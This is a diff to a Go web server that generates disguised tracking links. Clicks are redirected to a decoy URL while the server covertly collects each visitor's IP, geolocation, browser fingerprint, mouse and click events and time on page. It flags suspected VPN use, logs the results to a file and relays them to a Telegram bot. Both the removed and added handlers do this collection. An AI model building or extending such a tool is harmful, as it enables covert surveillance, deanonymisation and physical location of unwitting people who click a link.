@@ -4,10 +4,10 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"log"
 	"math/rand"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -17,10 +17,23 @@ type LinkData struct {
 	DecoyURL string `json:"decoyUrl"`
 }
 
-var linkStore = make(map[string]string)
+type TrackData struct {
+	ID          string                   `json:"id"`
+	Fingerprint map[string]interface{}   `json:"fingerprint"`
+	Geo         interface{}              `json:"geo"`
+	Events      []map[string]interface{} `json:"events"`
+	Duration    int64                    `json:"duration"`
+}
+
+type LinkInfo struct {
+	DecoyURL string
+}
+
+var linkStore = make(map[string]LinkInfo)
 
 var telegramBotToken = os.Getenv("TELEGRAM_BOT_TOKEN")
 var telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")
+var linkPrefix = os.Getenv("LINK_PREFIX")
 
 func generateID() string {
 	rand.Seed(time.Now().UnixNano())
@@ -51,55 +64,52 @@ func generateLink(c *gin.Context) {
 	}
 
 	id := generateID()
-	linkStore[id] = data.DecoyURL
-	c.JSON(http.StatusOK, gin.H{"link": fmt.Sprintf("http://13.214.77.124:8080/t/%s", id)})
+	linkStore[id] = LinkInfo{DecoyURL: data.DecoyURL}
+	c.JSON(http.StatusOK, gin.H{"link": fmt.Sprintf("%s/track/%s", linkPrefix, id)})
+}
+
+func trackDeepData(c *gin.Context) {
+	var data TrackData
+	if err := c.BindJSON(&data); err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid tracking data"})
+		return
+	}
+
+	geoJSON, _ := json.Marshal(data.Geo)
+	geoStr := string(geoJSON)
+	vpnSuspect := strings.Contains(geoStr, "Cloud") || strings.Contains(geoStr, "Relay") || strings.Contains(geoStr, "Apple") || strings.Contains(geoStr, "Hosting")
+	vpnLabel := ""
+	if vpnSuspect {
+		vpnLabel = "\n⚡ *Possible VPN/Relay Detected!*"
+	}
+
+	entry := fmt.Sprintf("\n\n✅ Deep Tracking\nID: %s\nDuration: %dms\nFingerprint: %+v\nGeo: %+v\nEvents: %d\n-----------\n",
+		data.ID, data.Duration, data.Fingerprint, data.Geo, len(data.Events))
+
+	f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	defer f.Close()
+	f.WriteString(entry)
+
+	summary := fmt.Sprintf("📍 *Deep Tracking Triggered!*\nID: `%s`\nBrowser: `%s`\nDuration: `%dms`\nClicks/Moves: `%d`%s",
+		data.ID,
+		data.Fingerprint["userAgent"],
+		data.Duration,
+		len(data.Events),
+		vpnLabel)
+
+	sendTelegramMessage(summary)
+	c.JSON(http.StatusOK, gin.H{"status": "tracked"})
 }
 
 func redirectHandler(c *gin.Context) {
 	id := c.Param("id")
-	decoyURL, exists := linkStore[id]
+	link, exists := linkStore[id]
 	if !exists {
 		c.JSON(http.StatusNotFound, gin.H{"error": "Link not found"})
 		return
 	}
 
-	ip := c.ClientIP()
-	userAgent := c.Request.UserAgent()
-
-	geoResp, err := http.Get("http://ip-api.com/json/" + ip)
-	if err != nil {
-		log.Printf("Geo lookup failed: %v", err)
-		geoResp = nil
-	}
-	defer func() {
-		if geoResp != nil {
-			_ = geoResp.Body.Close()
-		}
-	}()
-
-	var geo map[string]interface{}
-	if geoResp != nil && geoResp.StatusCode == 200 {
-		_ = json.NewDecoder(geoResp.Body).Decode(&geo)
-	}
-
-	logEntry := fmt.Sprintf("Time: %s\nIP: %s\nUser-Agent: %s\nLocation: %v\n-------------------------\n",
-		time.Now().Format(time.RFC1123), ip, userAgent, geo)
-	f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	defer f.Close()
-	f.WriteString(logEntry)
-
-	lat, latOK := geo["lat"].(float64)
-	lon, lonOK := geo["lon"].(float64)
-	mapsLink := ""
-	if latOK && lonOK {
-		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%.6f,%.6f)", lat, lon)
-	}
-
-	telegramMsg := fmt.Sprintf("📍 *Tracking Link Clicked!*\nIP: `%s`\nUser-Agent: `%s`\nLocation: %v\n%s",
-		ip, userAgent, geo, mapsLink)
-	sendTelegramMessage(telegramMsg)
-
-	c.Redirect(http.StatusTemporaryRedirect, decoyURL)
+	c.Redirect(http.StatusTemporaryRedirect, fmt.Sprintf("/track/%s", id))
 }
 
 func main() {
@@ -117,7 +127,9 @@ func main() {
 	})
 
 	r.POST("/api/generate", generateLink)
+	r.POST("/api/track", trackDeepData)
 	r.GET("/t/:id", redirectHandler)
-	fmt.Println("Server started at http://localhost:8080")
+
+	fmt.Println("Server started at http://0.0.0.0:8080")
 	r.Run("0.0.0.0:8080")
 }
